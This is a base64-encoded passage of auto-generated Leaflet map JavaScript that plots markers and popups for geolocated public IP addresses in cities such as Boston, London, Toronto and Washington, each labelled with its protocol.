MzZjNjBhNGIyM2I0MDhkZWUwOWIwOWQyOGQpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzMxYWYwZTQyZWE2MzQ2MWNhMWE1MzBmNmVlNmQ5NjAwLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9kOGY4YmUwYzMzYjE0MjE4ODUyMDM0MzY4ZTZiZjIwYSA9IEwubWFya2VyKAogICAgICAgICAgICBbNDIuMzU4NCwgLTcxLjA1OThdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8yZDQwYjQxZTVlZjg0NTFmODUyMTNlY2M2MWVjMDY2YyA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9kOGY4YmUwYzMzYjE0MjE4ODUyMDM0MzY4ZTZiZjIwYS5zZXRJY29uKGljb25fMmQ0MGI0MWU1ZWY4NDUxZjg1MjEzZWNjNjFlYzA2NmMpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZWM4NDhmYzEyYWIxNDVmM2EyNTk5YjhjOTBjMWUyMWMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9iOGQxZGIwZWI5NDc0OTI5YTQwMWQxMWY0Yzk2OGVhYSA9ICQoYDxkaXYgaWQ9Imh0bWxfYjhkMWRiMGViOTQ3NDkyOWE0MDFkMTFmNGM5NjhlYWEiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1NYXNzYWNodXNldHRzLCBDaXR5PUJvc3RvbiwgTG9uZ2l0dWRlPS03MS4wNTk4LCBMYXRpdHVkZT00Mi4zNTg0PGJyPjkxLjE4OS45MS4yMzxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9lYzg0OGZjMTJhYjE0NWYzYTI1OTliOGM5MGMxZTIxYy5zZXRDb250ZW50KGh0bWxfYjhkMWRiMGViOTQ3NDkyOWE0MDFkMTFmNGM5NjhlYWEpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9kOGY4YmUwYzMzYjE0MjE4ODUyMDM0MzY4ZTZiZjIwYS5iaW5kUG9wdXAocG9wdXBfZWM4NDhmYzEyYWIxNDVmM2EyNTk5YjhjOTBjMWUyMWMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2Q4ZjhiZTBjMzNiMTQyMTg4NTIwMzQzNjhlNmJmMjBhLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYEJvc3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2YyZWEzZmE4YWQ0NjRlMzU4NjEzOGI4ZTkyMTQ5ZWViID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fYmE3MmFjNzgzYWJlNDEwY2E3NmQ0MTNkZTMzOWIwZjUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZjJlYTNmYThhZDQ2NGUzNTg2MTM4YjhlOTIxNDllZWIuc2V0SWNvbihpY29uX2JhNzJhYzc4M2FiZTQxMGNhNzZkNDEzZGUzMzliMGY1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzZkY2RlNGVhYWFlYTRiZmZiMjkxMjVlZGE3MGQzNzI5ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYWU1YWNhYWFmNTg5NDhkNjg3NjI0YWZlMzdmMmIxMjMgPSAkKGA8ZGl2IGlkPSJodG1sX2FlNWFjYWFhZjU4OTQ4ZDY4NzYyNGFmZTM3ZjJiMTIzIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuOTUuMTU8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzZkY2RlNGVhYWFlYTRiZmZiMjkxMjVlZGE3MGQzNzI5LnNldENvbnRlbnQoaHRtbF9hZTVhY2FhYWY1ODk0OGQ2ODc2MjRhZmUzN2YyYjEyMyk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2YyZWEzZmE4YWQ0NjRlMzU4NjEzOGI4ZTkyMTQ5ZWViLmJpbmRQb3B1cChwb3B1cF82ZGNkZTRlYWFhZWE0YmZmYjI5MTI1ZWRhNzBkMzcyOSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZjJlYTNmYThhZDQ2NGUzNTg2MTM4YjhlOTIxNDllZWIuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8wNTY2ODdhMjFiNWY0NWFhOGI5NzljM2M4MTQwYzI2YSA9IEwubWFya2VyKAogICAgICAgICAgICBbNDIuMzU4NCwgLTcxLjA1OThdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl83YTU2N2IxNWJhNDA0MzI0YTYyMWZkM2JjYzExYTU5NiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8wNTY2ODdhMjFiNWY0NWFhOGI5NzljM2M4MTQwYzI2YS5zZXRJY29uKGljb25fN2E1NjdiMTViYTQwNDMyNGE2MjFmZDNiY2MxMWE1OTYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNTRkNjg4MTFiZTBhNDU5Mzk5MDQxOWM2OWNkN2I1Y2YgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF82ZDY1ZTQwYzk5NGE0ODY1OTM1OTc0OTE2MWQ3ODFiMiA9ICQoYDxkaXYgaWQ9Imh0bWxfNmQ2NWU0MGM5OTRhNDg2NTkzNTk3NDkxNjFkNzgxYjIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1NYXNzYWNodXNldHRzLCBDaXR5PUJvc3RvbiwgTG9uZ2l0dWRlPS03MS4wNTk4LCBMYXRpdHVkZT00Mi4zNTg0PGJyPjkxLjE4OS45MS4yMzxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81NGQ2ODgxMWJlMGE0NTkzOTkwNDE5YzY5Y2Q3YjVjZi5zZXRDb250ZW50KGh0bWxfNmQ2NWU0MGM5OTRhNDg2NTkzNTk3NDkxNjFkNzgxYjIpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8wNTY2ODdhMjFiNWY0NWFhOGI5NzljM2M4MTQwYzI2YS5iaW5kUG9wdXAocG9wdXBfNTRkNjg4MTFiZTBhNDU5Mzk5MDQxOWM2OWNkN2I1Y2YpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzA1NjY4N2EyMWI1ZjQ1YWE4Yjk3OWMzYzgxNDBjMjZhLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYEJvc3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzhlZjMxNThkZWEwNDQwYThhNWFkOWE1NzVjY2Q3Zjk5ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZTUxMjJkYmEzODUyNDExMWExNTE0ZGU3YjliNmViOGEgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfOGVmMzE1OGRlYTA0NDBhOGE1YWQ5YTU3NWNjZDdmOTkuc2V0SWNvbihpY29uX2U1MTIyZGJhMzg1MjQxMTFhMTUxNGRlN2I5YjZlYjhhKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzA0OWY1NmZjZjE3NDQyMGVhOTZjMjgyNjIzNjliZjYzID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfYWU3ZWEwMGI5MWRiNDNkOWEzOGJmMDlmYjE0ZTU3YTIgPSAkKGA8ZGl2IGlkPSJodG1sX2FlN2VhMDBiOTFkYjQzZDlhMzhiZjA5ZmIxNGU1N2EyIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuODguMTYxPGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzA0OWY1NmZjZjE3NDQyMGVhOTZjMjgyNjIzNjliZjYzLnNldENvbnRlbnQoaHRtbF9hZTdlYTAwYjkxZGI0M2Q5YTM4YmYwOWZiMTRlNTdhMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzhlZjMxNThkZWEwNDQwYThhNWFkOWE1NzVjY2Q3Zjk5LmJpbmRQb3B1cChwb3B1cF8wNDlmNTZmY2YxNzQ0MjBlYTk2YzI4MjYyMzY5YmY2MykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfOGVmMzE1OGRlYTA0NDBhOGE1YWQ5YTU3NWNjZDdmOTkuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzRiNWZhNGZjMmY4ODQ3ZjE4ZjUzNmM4NGY3ZWVhMTJlID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzMwZDY2ZmZmNjg1NzRiM2I4M2I1ZDUxNzc1ZjZmN2E2ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzRiNWZhNGZjMmY4ODQ3ZjE4ZjUzNmM4NGY3ZWVhMTJlLnNldEljb24oaWNvbl8zMGQ2NmZmZjY4NTc0YjNiODNiNWQ1MTc3NWY2ZjdhNik7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF81MDE5ZGI3YTc0ZGE0MjY5YTIzNjVmY2U1YzE3MDY2NiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzczYzQzZWU0OTAyYzRkZjY4YjA5M2NiZWRhYzliNTM1ID0gJChgPGRpdiBpZD0iaHRtbF83M2M0M2VlNDkwMmM0ZGY2OGIwOTNjYmVkYWM5YjUzNSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81MDE5ZGI3YTc0ZGE0MjY5YTIzNjVmY2U1YzE3MDY2Ni5zZXRDb250ZW50KGh0bWxfNzNjNDNlZTQ5MDJjNGRmNjhiMDkzY2JlZGFjOWI1MzUpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl80YjVmYTRmYzJmODg0N2YxOGY1MzZjODRmN2VlYTEyZS5iaW5kUG9wdXAocG9wdXBfNTAxOWRiN2E3NGRhNDI2OWEyMzY1ZmNlNWMxNzA2NjYpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzRiNWZhNGZjMmY4ODQ3ZjE4ZjUzNmM4NGY3ZWVhMTJlLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8xNzYwOWE0OTlhN2E0YWQzOTlmNWFmY2ZjMjViMzhiNCA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8yOGQ2NmViMmNiNzg0NWFmYmFmNWJmMWU4N2RjNDQ0ZiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8xNzYwOWE0OTlhN2E0YWQzOTlmNWFmY2ZjMjViMzhiNC5zZXRJY29uKGljb25fMjhkNjZlYjJjYjc4NDVhZmJhZjViZjFlODdkYzQ0NGYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfZmI4MDE0MjZkMjI0NGE2NmJjZWM0YWVlNTQ1NDkwZmEgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8xMWZmYmQwMGUxMWI0NzZjOTZkYWY0ODNiZThiMWU2ZCA9ICQoYDxkaXYgaWQ9Imh0bWxfMTFmZmJkMDBlMTFiNDc2Yzk2ZGFmNDgzYmU4YjFlNmQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjg4LjI1NS4xMTU8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2ZiODAxNDI2ZDIyNDRhNjZiY2VjNGFlZTU0NTQ5MGZhLnNldENvbnRlbnQoaHRtbF8xMWZmYmQwMGUxMWI0NzZjOTZkYWY0ODNiZThiMWU2ZCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzE3NjA5YTQ5OWE3YTRhZDM5OWY1YWZjZmMyNWIzOGI0LmJpbmRQb3B1cChwb3B1cF9mYjgwMTQyNmQyMjQ0YTY2YmNlYzRhZWU1NDU0OTBmYSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMTc2MDlhNDk5YTdhNGFkMzk5ZjVhZmNmYzI1YjM4YjQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzYwYzk1NGJhN2E1MjQ0OGI5MjliYTFlMTg1MTQ2NGE5ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2RlZDk0MTEzMzhmMjQ2NTI4MTk4NWM2NjU2OTJlMmVlID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzYwYzk1NGJhN2E1MjQ0OGI5MjliYTFlMTg1MTQ2NGE5LnNldEljb24oaWNvbl9kZWQ5NDExMzM4ZjI0NjUyODE5ODVjNjY1NjkyZTJlZSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8wNzNkMmE2MjdlZWU0ODE3YWYzNjNlYjNkOTdlNzYyNSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2M4YzIyYThkNzE4ODQ0NDFhZTZjMjQ3ZmE2MzRjMDIyID0gJChgPGRpdiBpZD0iaHRtbF9jOGMyMmE4ZDcxODg0NDQxYWU2YzI0N2ZhNjM0YzAyMiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj4xNjguNjIuMzIuMjA8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzA3M2QyYTYyN2VlZTQ4MTdhZjM2M2ViM2Q5N2U3NjI1LnNldENvbnRlbnQoaHRtbF9jOGMyMmE4ZDcxODg0NDQxYWU2YzI0N2ZhNjM0YzAyMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzYwYzk1NGJhN2E1MjQ0OGI5MjliYTFlMTg1MTQ2NGE5LmJpbmRQb3B1cChwb3B1cF8wNzNkMmE2MjdlZWU0ODE3YWYzNjNlYjNkOTdlNzYyNSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfNjBjOTU0YmE3YTUyNDQ4YjkyOWJhMWUxODUxNDY0YTkuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9kNmI1M2Y3MDBkMGQ0OTI3YjY5YjAyNmJlOWIxM2U4ZiA9IEwubWFya2VyKAogICAgICAgICAgICBbMzcuNzUxLCAtOTcuODIyXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZTYwZjhmN2ZhMjExNGE1MDhhMmRjNDVlNzI0MDNhZWMgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZDZiNTNmNzAwZDBkNDkyN2I2OWIwMjZiZTliMTNlOGYuc2V0SWNvbihpY29uX2U2MGY4ZjdmYTIxMTRhNTA4YTJkYzQ1ZTcyNDAzYWVjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2NiYmMxNDYyOTcxYjQwOGRiYmQyMjNkZDdmYzU1OWQ2ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNzU4ZWQxNTE4MTU5NDIwOWE1YzQ5MDE3NDdlOGRiNjEgPSAkKGA8ZGl2IGlkPSJodG1sXzc1OGVkMTUxODE1OTQyMDlhNWM0OTAxNzQ3ZThkYjYxIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgTG9uZ2